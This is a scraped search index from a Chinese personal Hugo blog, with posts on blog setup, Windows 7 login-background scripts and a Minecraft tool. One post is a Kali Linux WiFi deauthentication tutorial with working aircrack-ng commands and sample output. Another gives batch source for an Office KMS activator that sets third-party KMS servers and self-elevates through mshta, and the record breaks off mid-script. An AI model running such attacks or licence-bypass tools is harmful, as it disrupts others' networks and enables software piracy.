获得加密后的代码随机插入至站点某个引用的脚本其中，就会让那些镜像站的垃圾无从下手。\n至此问题就基本解决了。让那些Yee玩意哭去吧\n","date":"2023-07-27T10:11:14+07:00","image":"https://blog.xpdbk.com/post/web-fake-fandai/photo_2023-07-27_21-08-20_hu68f97284395256fe3416fb9c7dead3a2_8074_120x120_fill_q75_h2_box_smart1_2.webp","permalink":"https://blog.xpdbk.com/post/web-fake-fandai/","title":"记一次博客被反向代理"},{"content":" 仅为技术科普，请勿用于非法用途\n内容未隐讳任何个人、群体、公司。非文学作品，请勿用于阅读理解的练习\n根据《计算机软件保护条例》第十七条，本站所有软件请仅用于学习研究用途\n本站一切资源不代表本站立场，并不代表本站赞同其观点和对其真实性负责\n当我们连接到Wi-Fi网络时，我们通常会认为我们的连接是安全的。但是，有些人可能会利用Wi-Fi协议中的漏洞进行攻击，使得我们的设备无法继续与网络通信。这就是WiFi Deauthentication攻击的基本原理。\n在本文中，我要介绍如何使用Kali Linux执行WiFi Deauthentication攻击。\n.-. ____ / \\ / \\ / \\ | 0 0 | / O \\ | -- | /_________\\ \\______/ / \\ / \\ / \\ / \\ / \\ /_____________________\\ | | | kali-linux- | | wifi-deauth-attack- | | guide | |_____________________| | | | | |__| |__| 准备工作 在开始之前，您需要准备以下工具：\n一台安装了Kali Linux的计算机。 一个支持监视模式的无线网卡（可用外置网卡）。 步骤 以下是执行WiFi Deauthentication攻击的基本步骤：\n打开终端并启用监视模式。您可以使用以下命令：\n1 sudo airmon-ng start wlan0 扫描可用的WiFi网络。您可以使用以下命令：\n1 sudo airodump-ng wlan0mon 这将显示周围的所有WiFi网络的详细信息，包括SSID、BSSID和信号强度等信息。\n找到您要攻击的WiFi网络的BSSID和信道。您可以在airodump-ng的输出中找到这些信息。\n执行Deauthentication攻击。您可以使用以下命令：\n1 sudo aireplay-ng --deauth \u0026lt;数量\u0026gt; -a \u0026lt;BSSID\u0026gt; -c \u0026lt;目标设备的MAC地址\u0026gt; wlan0mon 在上面的命令中，\u0026lt;数量\u0026gt;表示要发送的Deauthentication帧的数量，\u0026lt;BSSID\u0026gt;表示要攻击的WiFi网络的BSSID，\u0026lt;目标设备的MAC地址\u0026gt;表示要攻击的设备的MAC地址。wlan0mon是启用了监视模式的接口名称。\n您可以使用aireplay-ng的其他选项来更改攻击的参数，例如更改攻击间隔时间或使用不同的攻击模式等。\n输出的结果\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 user@kali:~$ sudo airmon-ng start wlan0 [sudo] password for user: Found 5 processes that could cause trouble. If airodump-ng, aireplay-ng or airtun-ng stops working after a short period of time, you may want to run \u0026#39;airmon-ng check kill\u0026#39; PID Name 789 NetworkManager 890 wpa_supplicant 901 dhclient 1234 avahi-daemon 1235 avahi-daemon PHY\tInterface\tDriver\tChipset phy0\twlan0\tath9k\tQualcomm Atheros AR9485 Wireless Network Adapter (rev 01) (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon) (mac80211 station mode vif disabled for [phy0]wlan0) user@kali:~$ sudo airodump-ng wlan0mon CH 6 ][ Elapsed: 1 min ][ 2023-08-03 14:00 ][ fixed channel wlan0mon: -1 BSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID 00:11:22:33:44:55 -40 100 600 100 2 6 54e. WPA2 CCMP PSK Wifi-1 AA:BB:CC:DD:EE:FF -50 0 500 0 0 6 54e. WPA2 CCMP PSK Wifi-2 FF:FF:FF:FF:FF:FF -60 0 400 0 0 6 54e. WPA2 CCMP PSK Wifi-3 BSSID STATION PWR Rate Lost Frames Probe (not associated) AA:BB:CC:DD:EE:FF -1 -1 - -1 - -1 (not associated) BB:CC:DD:EE:FF:AA -1 -1 - -1 - -1 (not associated) CC:DD:EE:FF:AA:BB -1 -1 - -1 - -1 user@kali:~$ sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon 14:01:23 Waiting for beacon frame (BSSID: 00:11:22:33:44:55) on channel 6 14:01:23 Sending 10 directed DeAuth. STMAC: [AA:BB:CC:DD:EE:FF] [ 0|10 ACKs] 14:01:23 Sending 10 directed DeAuth. STMAC: [AA:BB:CC:DD:EE:FF] [10|10 ACKs] 注意事项 在执行WiFi Deauthentication攻击时，请注意以下几点：\n请确保您拥有合法的授权，并且只在法律允许的情况下使用此技术。 请勿将此技术用于未经授权的网络。 请勿将此技术用于任何非法用途。 结论 WiFi Deauthentication攻击是一种利用WiFi协议漏洞的攻击方式，可以使得连接到特定WiFi网络的设备无法继续与该网络通信。在Kali Linux中，您可以使用aireplay-ng和airmon-ng这两个工具来执行此类攻击。但请注意，这种攻击可能会导致法律问题，因此请确保您拥有合法的授权，并且只在法律允许的情况下使用此技术。\n视频效果演示 想看具体教程可以到我的Youtube频道看（B站审核严）\n","date":"2023-07-17T00:00:00+07:00","permalink":"https://blog.xpdbk.com/post/kali-linux-wifi-deauthentication-attack-guide/","title":"使用Kali Linux进行WiFi Deauthentication攻击的学习"},{"content":"博客命令记录 代码块语言支持 Prefix Language A ABAP, ABNF, ActionScript, ActionScript 3, Ada, AL, Angular2, ANTLR, ApacheConf, APL, AppleScript, ArangoDB AQL, Arduino, ArmAsm, AutoHotkey, AutoIt, Awk B Ballerina, Bash, Bash Session, Batchfile, BibTeX, Bicep, BlitzBasic, BNF, BQN, Brainfuck C C, C#, C++, Caddyfile, Caddyfile Directives, Cap\u0026rsquo;n Proto, Cassandra CQL, Ceylon, CFEngine3, cfstatement, ChaiScript, Chapel, Cheetah, Clojure, CMake, COBOL, CoffeeScript, Common Lisp, Coq, Crystal, CSS, Cython D D, Dart, Diff, Django/Jinja, dns, Docker, DTD, Dylan E EBNF, Elixir, Elm, EmacsLisp, Erlang F Factor, Fennel, Fish, Forth, Fortran, FortranFixed, FSharp G GAS, GDScript, Genshi, Genshi HTML, Genshi Text, Gherkin, GLSL, Gnuplot, Go, Go HTML Template, Go Text Template, GraphQL, Groff, Groovy H Handlebars, Haskell, Haxe, HCL, Hexdump, HLB, HLSL, HolyC, HTML, HTTP, Hy I Idris, Igor, INI, Io, ISCdhcpd J J, Java, JavaScript, JSON, Julia, Jungle K Kotlin L Lighttpd configuration file, LLVM, Lua M Makefile, Mako, markdown, Mason, Mathematica, Matlab, mcfunction, Meson, Metal, MiniZinc, MLIR, Modula-2, MonkeyC, MorrowindScript, Myghty, MySQL N NASM, Natural, Newspeak, Nginx configuration file, Nim, Nix O Objective-C, OCaml, Octave, Odin, OnesEnterprise, OpenEdge ABL, OpenSCAD, Org Mode P PacmanConf, Perl, PHP, PHTML, Pig, PkgConfig, PL/pgSQL, plaintext, Plutus Core, Pony, PostgreSQL SQL dialect, PostScript, POVRay, PowerQuery, PowerShell, Prolog, PromQL, properties, Protocol Buffer, PSL, Puppet, Python, Python 2 Q QBasic, QML R R, Racket, Ragel, Raku, react, ReasonML, reg, reStructuredText, Rexx, Ruby, Rust S SAS, Sass, Scala, Scheme, Scilab, SCSS, Sed, Sieve, Smali, Smalltalk, Smarty, Snobol, Solidity, SourcePawn, SPARQL, SQL, SquidConf, Standard ML, stas, Stylus, Svelte, Swift, SYSTEMD, systemverilog T TableGen, Tal, TASM, Tcl, Tcsh, Termcap, Terminfo, Terraform, TeX, Thrift, TOML, TradingView, Transact-SQL, Turing, Turtle, Twig, TypeScript, TypoScript, TypoScriptCssData, TypoScriptHtmlData V V, V shell, Vala, VB.net, verilog, VHDL, VHS, VimL, vue W WDTE, WebGPU Shading Language, Whiley X XML, Xorg Y YAML, YANG Z Z80 Assembly, Zed, Zig 主题相关 FrontMatter 字段含义\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 title: 标题 description: 描述 date: 时间（1111-11-11） image: 显示的特色图片 comments: 显示 / 隐藏评论区(T/F) license: 文章协议 输入 false 可以隐藏 hidden: 隐藏文章（不在首页，归档等页面显示，但是可以直接通过链接访问） math: 是否加载 KaTeX 脚本 slug: 固定链接 draft: 是否为草稿 categories: - 分类 tags: - 标签 lastmod: 上次更新时间 keywords: \u0026#34;关键词\u0026#34; MarkDown相关 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 # 我是一级标题 ## 我是二级标题 ### 我是三级标题 #### 我是四级标题 ##### 我是五级标题 ###### 我是六级标题 *斜体文本* **粗体文本** ***粗斜体文本*** 一行中用三个以上的星号*、减号-、底线_来建立一个分隔线 ~~删除线~~ \u0026lt;u\u0026gt;带下划线文本\u0026lt;/u\u0026gt; 创建脚注格式类似这样 [^JiaoZhu]。 [^JiaoZhu]: 脚注的内容 列表： - 项目1 - 项目2 - 项目3 有序列表： 1. 第一项 2. 第二项 3. 第三项 \u0026gt; 区块引用 [链接文本](网址) ![图片描述](图片链接) 表格： | 表头1 | 表头2 | | ---- | ---- | | 单元格1 | 单元格2 | | 单元格3 | 单元格4 | 表格对齐方式： | 左对齐 | 右对齐 | 居中对齐 | | :---- | ----: | :----: | | 内容 | 内容 | 内容 | 简码 Stack 带有一组简码 ，您可以在您的内容中使用这些简码。\n此页面仅包含特定于 Stack 的简码。Hugo 的内置短代码记录在此处 。\n哔哩哔哩视频 嵌入哔哩哔哩 视频。\n1 {\u0026lt; bilibili VIDEO_ID PART_NUMBER \u0026gt;} # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} 可以Video_ID在视频的 URL 中找到。例如 的视频IDhttps://www.bilibili.com/video/av12345678为av12345678。AV和均受BV支持。\n是PART_NUMBER可选的。它可用于指定要播放的视频部分。例如，零件号https://www.bilibili.com/video/av12345678?p=2是2。\n腾讯视频 嵌入腾讯视频 视频。\n1 {\u0026lt; tencent VIDEO_ID \u0026gt;} # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} 可以Video_ID在视频的 URL 中找到。例如 的视频IDhttps://v.qq.com/x/cover/hzgtnf6tbvfekfv/g0014r3khdw.html为g0014r3khdw。\nYoutube 视频 嵌入YouTube 视频。\n1 {\u0026lt; youtube VIDEO_ID \u0026gt;} # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} 可以Video_ID在视频的 URL 中找到。例如 的视频IDhttps://www.youtube.com/watch?v=VIDEO_ID为VIDEO_ID。\n通用视频文件 嵌入视频文件\n1 2 3 # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} {\u0026lt; video src=\u0026#34;VIDEO_URL\u0026#34; autoplay=\u0026#34;true\u0026#34; poster=\u0026#34;./video-poster.webp\u0026#34; \u0026gt;} # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} 可以VIDEO_URL是 URL 或相对于目录的路径static。例如，src=\u0026quot;/video/my-video.mp4\u0026quot;将嵌入您站点文件夹的视频文件static/video/my-video.mp4。\n该autoplay属性是可选的。它可用于指定是否应自动播放视频。该poster属性是可选的。它可用于指定视频的海报图像。\nGitLab 嵌入GitLab 片段。\n1 {\u0026lt; gitlab SNIPPET_ID \u0026gt;} # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} 可以SNIPPET_ID在片段的 URL 中找到。例如，代码段 IDhttps://gitlab.com/-/snippets/1234567是1234567。\n引用 1 2 3 {\u0026lt; quote author=\u0026#34;A famous person\u0026#34; source=\u0026#34;The book they wrote\u0026#34; url=\u0026#34;https://en.wikipedia.org/wiki/Book\u0026#34;\u0026gt;} # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. {\u0026lt; /quote \u0026gt;} # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} 通过上述组织，您可以像这样在您的内容中插入图像：\n1 2 3 --- content/post/my-first-post/index.md --- ![Image 1](image1.webp) ![Image 2](image2.webp) 插入图库 要插入图片库，您需要为图片库创建一个页面包。例如：\n1 2 3 4 5 6 7 content └── gallery └── my-first-gallery ├── index.md ├── image1.webp ├── image2.webp └── image3.webp 1 2 3 --- content/gallery/my-first-gallery/index.md --- ![Image 1](image1.webp) ![Image 2](image2.webp) ![Image 1](image3.webp) 它将呈现两行，第一行有两张图像，第二行有一张图像。\n高斯模糊 在你的文章中直接输入 是高斯模糊呐~\n1 \u0026lt;span class=\u0026#34;blur\u0026#34;\u0026gt;是高斯模糊呐~ \u0026lt;/span\u0026gt; 黑幕效果 在你的文章中直接输入 诶嘿嘿，我藏好了哦\n1 \u0026lt;span class=\u0026#34;shady\u0026#34;\u0026gt;诶嘿嘿，我藏好了哦\u0026lt;/span\u0026gt; 坑 这样一搞的话回车键/Tab的换行就完蛋了= =, 可以用\u0026lt;br\u0026gt;放在行末尾来换行\n1 2 3 \u0026lt;span class=\u0026#34;blur\u0026#34;\u0026gt;行1 \u0026lt;br\u0026gt; 行2 \u0026lt;br\u0026gt; 行3\u0026lt;/span\u0026gt; 因为它没用= = 即答) 别打我 逃)\n支持美人鱼JS和Ketax数学公式\nGoogle广告 已经植入到cfg文件\nhugo文章加密 title: \u0026ldquo;This Is An Encrypted Post\u0026rdquo; This content is visible to anyone.\n以下内容被密码保护\nJavascript needs to be enabled to decrypt content This content will be encrypted!\n1 2 3 4 5 6 7 8 This content is visible to anyone. {% hugo-encrypt \u0026#34;postspecificpassword\u0026#34; %} # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} This content will be encrypted! {% /hugo-encrypt %} # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} 视频API测试（MP4） 1 {\u0026lt; video src=\u0026#34;\u0026#34; autoplay=\u0026#34;false\u0026#34; poster=\u0026#34;./avatar.webp\u0026#34; \u0026gt;} # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} 重点标记 这是一个重点标记 1 {\u0026lt; mark text=\u0026#34;这是一个重点标记\u0026#34; \u0026gt;} 缩写 缩写的文本 1 {\u0026lt; abbr title=\u0026#34;这里有着非常非常非常非常非常非常非常非常长的缩写内容~\u0026#34; text=\u0026#34;缩写的文本\u0026#34; \u0026gt;} # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} 文字居中 文字居中\n1 {\u0026lt; align center \u0026#34;文字居中\u0026#34; \u0026gt;} # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} 块引用 死亡不是一切的终点，遗忘才是\n电影 《寻梦环游记》 1 2 3 {\u0026lt; blockquote author=\u0026#34;电影\u0026#34; link=\u0026#34;https://irithys.com\u0026#34; title=\u0026#34;《寻梦环游记》\u0026#34; \u0026gt;} # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} 死亡不是一切的终点，遗忘才是 {\u0026lt; /blockquote \u0026gt;} 隐藏 点下我呀 对看到这行文字的人报以深切的祝福！ 1 2 3 {\u0026lt; detail \u0026#34;点下我呀\u0026#34; \u0026gt;} # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} 对看到这行文字的人报以深切的祝福！ {\u0026lt; /detail \u0026gt;} 标签 警告！这个标签太好看了，我忍不住分享。\n1 2 3 {\u0026lt; notice notice-warning \u0026gt;} # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} 警告！这个标签太好看了，我忍不住分享。 {\u0026lt; /notice \u0026gt;} 这是第一个标签，将 notice-warning 分别修改为 notice-note、notice-info、notice-tip 就可以得到其他三个不同样式的标签啦\n音乐 1 {\u0026lt; music id=\u0026#34;557578993\u0026#34; type=\u0026#34;song\u0026#34; server=\u0026#34;netease\u0026#34; \u0026gt;} # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} 网易云 1 {\u0026lt; netease 557578993 0 \u0026gt;}} # 为了不让加载，正常应该 {\u0026lt; 内容 \u0026gt;} 按键 1 Press \u0026lt;kbd\u0026gt;CTRL\u0026lt;/kbd\u0026gt; + \u0026lt;kbd\u0026gt;ALT\u0026lt;/kbd\u0026gt; + \u0026lt;kbd\u0026gt;Delete\u0026lt;/kbd\u0026gt; to end the session. Press CTRL + ALT + Delete to end the session.\ngithub hugo public The world’s fastest framework for building websites. GO 1 {\u0026lt; github name=\u0026#34;hugo\u0026#34; link=\u0026#34;https://github.com/gohugoio/hugo\u0026#34; description=\u0026#34;The world’s fastest framework for building websites.\u0026#34; color=\u0026#34;#00add8\u0026#34; language=\u0026#34;GO\u0026#34; \u0026gt;} 参数 解释 name 仓库名 link 链接 description 简介 color 颜色 language 语言 简洁版彩色标签 warning 可以换成 info tip note\n1 2 3 {\u0026lt; simple-notice simple-notice-warning \u0026gt;} warning 可以换成 info tip note {\u0026lt; /simple-notice \u0026gt;} 块引用2 十里青山远，潮平路带沙。数声啼鸟怨年华。又是凄凉时候，在天涯。白露收残月，清风散晓霞。绿杨堤畔问荷花。记得年时沽酒，那人家。\n1 2 3 {\u0026lt; myquote \u0026gt;} 十里青山远，潮平路带沙。数声啼鸟怨年华。又是凄凉时候，在天涯。白露收残月，清风散晓霞。绿杨堤畔问荷花。记得年时沽酒，那人家。 {\u0026lt; /myquote \u0026gt;} 引用居中块 十里青山远，潮平路带沙\n数声啼鸟怨年华\n又是凄凉时候，在天涯\n白露收残月，清风散晓霞\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 {\u0026lt; quote-center \u0026gt;} 十里青山远，潮平路带沙\u0026lt;br\u0026gt;数声啼鸟怨年华\u0026lt;br\u0026gt;又是凄凉时候，在天涯\u0026lt;br\u0026gt;白露收残月，清风散晓霞 {\u0026lt; /quote-center \u0026gt;} `` ## 相册 \u003c!DOCTYPE html\u003e } ```go {\u0026lt; galleries \u0026gt;} {\u0026lt; gallery src=\u0026#34;https://cdn.lovir.cn/photo/DSCF9645.webp\u0026#34; \u0026gt;} {\u0026lt; gallery src=\u0026#34;https://cdn.lovir.cn/photo/DSCF7385.webp\u0026#34; \u0026gt;} {\u0026lt; gallery src=\u0026#34;https://cdn.lovir.cn/photo/DSCF6903.webp\u0026#34; \u0026gt;} {\u0026lt; /galleries \u0026gt;} Spotify 1 {{/*\u0026lt; spotify type=\u0026#34;track\u0026#34; id=\u0026#34;2D3gvohUyOfXIVX6Mvhqae\u0026#34; height=\u0026#34;80px\u0026#34;\u0026gt;*/}} // layouts/shortcodes/spotify.html 时间轴 {{\u0026lt; timeline date=\u0026ldquo;2023-09-10\u0026rdquo; title=\u0026ldquo;awa\u0026rdquo; description=\u0026ldquo;awa\u0026rdquo; tags=\u0026ldquo;awa\u0026rdquo; url=\u0026ldquo;awa\u0026rdquo; \u0026gt;}}\n{{/\u0026lt; timeline date=\u0026ldquo;2023-09-10\u0026rdquo; title=\u0026quot;\u0026quot; description=\u0026quot;\u0026quot; tags=\u0026quot;\u0026quot; url=\u0026quot;\u0026quot; \u0026gt;/}}\n聊天 {{\u0026lt; chat position=\u0026ldquo;left\u0026rdquo; name=\u0026ldquo;John Doe\u0026rdquo; timestamp=\u0026ldquo;2023-09-12 14:30\u0026rdquo;\u0026gt;}} 这是左边的消息内容。 {{\u0026lt; /chat \u0026gt;}}\n{{\u0026lt; chat position=\u0026ldquo;right\u0026rdquo; name=\u0026ldquo;Alice\u0026rdquo; timestamp=\u0026ldquo;2023-09-12 14:45\u0026rdquo; \u0026gt;}} 这是右边的消息内容，测试长长长长长长长长长长长长长长长长长长长长长长长长度。 {{\u0026lt; /chat \u0026gt;}}\n","date":"2023-07-16T00:00:00+07:00","permalink":"https://blog.xpdbk.com/post/blog-ml/","title":"博客常用命令（离线用）"},{"content":"2B2T分布式基地管理器 2B2T基地管理器是一款专门为《Minecraft》2B2T服务器玩家设计的强大（挖坑）工具。无论你是新手还是老手，使用它都能够极大地提高您在这个服务器上的分布式基地建设体验。\n该工具可以帮助您自动化和简化许多基地管理任务。例如，您可以轻松地查看历史日志看看是谁炸了哪个基地，让您省去很多登录操作\n整个项目的结构 项目结构 flowchart TD A[C#] --\u0026gt; B(Go) B --\u0026gt; C{VUE3} 项目代码占比 pie title 项目代码占比 \u0026#34;C#\u0026#34; : 186 \u0026#34;VUE3\u0026#34; : 85 \u0026#34;GO\u0026#34; : 54 ","date":"2023-06-02T17:40:50+07:00","permalink":"https://blog.xpdbk.com/post/2b2t-check-jidi/","title":"2B2T分布式基地管理器"},{"content":"Win7一键更换登录背景脚本 需要\nWindows 7 旗舰版或企业版\n注册表\n组策略编辑器\n图片若干\n注册表脚本 蓝奏云 访问密码: i0f5 下面提供一键包\n源码\n禁用自定义登录背景\n1 2 3 Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI\\Background] \u0026#34;OEMBackground\u0026#34;=dword:00000000 启用自定义登录背景\n1 2 3 Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI\\Background] \u0026#34;OEMBackground\u0026#34;=dword:00000001 如果选择了新的主题，刚才设置的注册表值就会被重置为0。因为选择一个新的主题，会重新加载这个主题的配置文件。而因为配置文件中的注册表键值可能会是0，所以你只能在选择新主题后再次运行.reg脚本。\n替换登录壁纸文件 bat脚本更换登录壁纸源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 @echo off set \u0026#34;source=%~dp0backgroundDefault.webp\u0026#34; set \u0026#34;destination=C:\\Windows\\System32\\oobe\\info\\backgrounds\u0026#34; if not exist \u0026#34;%source%\u0026#34; ( echo \u0026#34;Error: %source% does not exist.\u0026#34; pause exit /b ) if not exist \u0026#34;%destination%\u0026#34; ( mkdir \u0026#34;%destination%\u0026#34; ) xcopy /y /exclude:%~nx0 \u0026#34;%source%\u0026#34; \u0026#34;%destination%\u0026#34; echo \u0026#34;LEl_FENG BLOG.XPDBK.COM!\u0026#34; pause bat脚本换回默认壁纸\n1 2 3 4 5 6 7 8 9 10 @echo off set folder=\u0026#34;C:\\Windows\\System32\\oobe\\info\u0026#34; if exist %folder% ( echo Deleting %folder%... rmdir /s /q %folder% echo Folder deleted. ) else ( echo %folder% does not exist. ) pause 图片一键包（图片改后缀和不是很好的图片压缩器） 图片压缩\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import os from PIL import Image def compress_image(input_path, output_path, max_size): with Image.open(input_path) as img: # 获取原图尺寸 width, height = img.size # 计算压缩比例 ratio = (max_size * 1024) / os.path.getsize(input_path) # 计算压缩后的尺寸 compressed_width = int(width * ratio) compressed_height = int(height * ratio) # 压缩图片并保存 img.thumbnail((compressed_width, compressed_height)) img.save(output_path) # 定义目标目录和最大文件大小 target_dir = \u0026#34;pop\u0026#34; max_file_size = 250 # 单位为 KB for root, dirs, files in os.walk(target_dir): for filename in files: if filename.endswith(\u0026#34;.webp\u0026#34;) or filename.endswith(\u0026#34;.webp\u0026#34;) or filename.endswith(\u0026#34;.webp\u0026#34;): input_path = os.path.join(root, filename) output_path = os.path.join(root, \u0026#34;compressed_\u0026#34; + filename) compress_image(input_path, output_path, max_file_size) 图片后缀转换\n1 2 3 4 5 6 7 8 9 10 import os from PIL import Image directory = \u0026#34;./pop\u0026#34; for filename in os.listdir(directory): if filename.endswith(\u0026#34;.webp\u0026#34;) or filename.endswith(\u0026#34;.webp\u0026#34;) or filename.endswith(\u0026#34;.bmp\u0026#34;): img_path = os.path.join(directory, filename) with Image.open(img_path) as im: im.convert(\u0026#39;RGB\u0026#39;).save(os.path.splitext(img_path)[0] + \u0026#34;.webp\u0026#34;) 注意： 建立名为backgroundDefault的图片。必须JPG格式的背景图片，保存到脚本所在的文件夹下。但文件大小必须控制在250KB以内，否则修改后的登录界面的背景图片就无法正常显示！\n做到这里，系统应该立即生效（不需要重启），可以锁定当前用户或注销来测试一下。锁定可以用徽标键加L键（WinKey+L）。\n如果想恢复原始的登录背景，只需要运行一键换回默认壁纸.bat就可以了。在找不到自定义图片时，Win7会自动使用默认的登录背景。\n下载一键包 蓝奏云 访问密码：b6uq\n压缩密码：TuPiangg114514\n完整性SHA-1校验码：fa60a42cb4754fecfc2a5a0760796229dc34512e\n","date":"2023-04-21T18:33:11+07:00","permalink":"https://blog.xpdbk.com/post/win7-login-reimg/","title":"Windows7换登录页照片脚本"},{"content":"Office KMS激活器 不允许用来做违法的事情，请体验完毕之后24H内删除\n可以直接用的EXE文件 由于原本的CMD指令太不方便了，所以我重新封装了一套EXE版本的，EXE的规格是x32估计很多电脑都可以运行。注意！本软件仅支持激活2010版本和2013版本2016版本\n蓝奏云 访问密码：hceu\n为了防止破解我加了壳子OVO\n源代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 @ECHO OFF REM QBFC Project Options Begin REM HasVersionInfo: Yes REM Companyname: LEl_FENG Studio REM Productname: Office KMS激活器 REM Filedescription: 本KMS激活器支持Office 2010,Office 2013,Office 2016 REM Copyrights: 禁止使用本程序违法 REM Trademarks: 114514 REM Originalname: Office kms REM Comments: 禁止使用本程序违法 REM Productversion: 13.24.41.23 REM Fileversion: 11.41.25.32 REM Internalname: office kms REM ExeType: console REM Architecture: x86 REM Appicon: blog\\blog\\my blog\\static\\favicon.ico REM AdministratorManifest: No REM QBFC Project Options End @ECHO ON @echo off mode con cols=75 lines=25 title=Office LEl_FENG setlocal EnableDelayedExpansion\u0026amp;color 71 \u0026amp; cd /d \u0026#34;%~dp0\u0026#34; %1 %2 ver|find \u0026#34;5.\u0026#34;\u0026gt;nul\u0026amp;\u0026amp;goto :start mshta vbscript:createobject(\u0026#34;shell.application\u0026#34;).shellexecute(\u0026#34;%~s0\u0026#34;,\u0026#34;goto :start\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;runas\u0026#34;,1)(window.close)\u0026amp;goto :eof :start set KMS_Sev=kms9.MSGuides.com cls echo 正在检查网络情况……耐心等待 echo. ping cloud.tencent.com | find \u0026#34;超时\u0026#34; \u0026gt; NUL \u0026amp;\u0026amp; goto fail ping cloud.tencent.com | find \u0026#34;目标主机\u0026#34; \u0026gt; NUL \u0026amp;\u0026amp; goto fail echo 本机网络良好…… goto office :office echo 检查安装的office…… call :GetOfficePath 14 Office2010 call :ActOffice 14 Office2010 call :GetOfficePath 15 Office2013 call :ActOffice 15 Office2013 if exist \u0026#34;%ProgramFiles%\\Microsoft Office\\Office16\\ospp.vbs\u0026#34; set _Office16Path=%ProgramFiles%\\Microsoft Office\\Office16 if exist \u0026#34;%ProgramFiles(x86)%\\Microsoft Office\\Office16\\ospp.vbs\u0026#34; set _Office16Path=%ProgramFiles(x86)%\\Microsoft Office\\Office16 if DEFINED _Office16Path (echo.\u0026amp;echo 已发现 Office2016 call :ActOffice 16 Office2016 ) else (echo.\u0026amp;echo 未发现 Office2016) echo.\u0026amp;pause exit :ActOffice if DEFINED _Office%1Path ( cd /d \u0026#34;!_Office%1Path!\u0026#34; if %1 EQU 16 call :Licens16 echo.\u0026amp;echo 尝试激活 %2 ...\u0026amp;echo. cscript //nologo ospp.vbs /sethst:kms.cangshui.net \u0026gt;nul cscript //nologo ospp.vbs /act | find /i \u0026#34;successful\u0026#34; \u0026amp;\u0026amp; ( echo.\u0026amp;echo ***** %2 激活成功 ***** \u0026amp; echo.) || (echo.\u0026amp;echo ***** %2 激活失败 ***** \u0026amp; echo.) ) cd /d \u0026#34;%~dp0\u0026#34; goto :EOF :GetOfficePath echo.\u0026amp;echo 检测 %2 系列产品的安装路径... set _Office%1Path= set _Reg32=HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Office\\%1.0\\Common\\InstallRoot set _Reg64=HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Office\\%1.0\\Common\\InstallRoot reg query \u0026#34;%_Reg32%\u0026#34; /v \u0026#34;Path\u0026#34; \u0026gt; nul 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; FOR /F \u0026#34;tokens=2*\u0026#34; %%a IN (\u0026#39;reg query \u0026#34;%_Reg32%\u0026#34; /v \u0026#34;Path\u0026#34;\u0026#39;) do SET \u0026#34;_OfficePath1=%%b\u0026#34; reg query \u0026#34;%_Reg64%\u0026#34; /v \u0026#34;Path\u0026#34; \u0026gt; nul 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; FOR /F \u0026#34;tokens=2*\u0026#34; %%a IN (\u0026#39;reg query \u0026#34;%_Reg64%\u0026#34; /v \u0026#34;Path\u0026#34;\u0026#39;) do SET \u0026#34;_OfficePath2=%%b\u0026#34; if DEFINED _OfficePath1 (if exist \u0026#34;%_OfficePath1%ospp.vbs\u0026#34; set _Office%1Path=!_OfficePath1!) if DEFINED _OfficePath2 (if exist \u0026#34;%_OfficePath2%ospp.vbs\u0026#34; set _Office%1Path=!_OfficePath2!) set _OfficePath1= set _OfficePath2= if DEFINED _Office%1Path (echo.\u0026amp;echo 已发现 %2) else (echo.\u0026amp;echo 未发现 %2) goto :EOF :Licens16 for /f %%x in (\u0026#39;dir /b 